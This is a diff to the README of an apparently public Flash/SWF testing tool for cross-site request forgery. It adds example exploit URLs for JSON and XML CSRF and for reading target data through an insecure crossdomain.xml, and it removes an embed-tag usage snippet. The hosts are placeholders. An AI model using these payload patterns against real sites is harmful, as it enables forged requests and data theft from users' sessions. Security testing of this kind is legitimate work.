@@ -27,6 +27,16 @@ This is useful for Chrome >=62, where you can't access SWF directly, or if you w
 
 If you have the questions regarding this repository - ping me in the Twitter: [@h1_sp1d3r](https://twitter.com/h1_sp1d3r)
 
+## Example cases
+1) Exploit JSON CSRF, POST-based:
+https://example.com/test.swf?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
+2) Exploit XML CSRF, POST-based:
+https://example.com/test.swf?jsonData=<root>[somedada]</root>&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint&ct=application/xml
+3) Exploit insecure crossdomain.xml (read data from target), GET-based:
+https://example.com/read.html?jsonData=&endpoint=https://sometargethost.com/endpoint&reqmethod=GET
+4) Exploit insecure crossdomain.xml (read data from target), POST-based, any content-type supported:
+https://example.com/read.html?jsonData=somedata&endpoint=https://sometargethost.com/endpoint&&ct=text/html
+
 ## Cross Browser Testing
 
 This project is tested on following browsers as follows:
@@ -68,9 +78,6 @@ By using this testing tool you accept the fact that any damage (dataleak, system
  Answer: no (it was possible in the past, but not now).
 
 ## Update
-Starting with Chrome 62, direct link to SWF file may not work. If this behavior happens, use custom HTML page with this, or any other embedding method:
-```
-<embed src='http[s]://[yourhost-and-path]/test.swf?jsonData=[yourJSON]&php_url=http[s]://[yourhost-and-path]/test.php&endpoint=http[s]://[targethost-and-endpoint]'></embed>
-```
+Starting with Chrome 62, direct link to SWF file may not work. If this behavior happens, use HTML wrapper.
 
 ## Commits, PRs and bug reports are welcome!
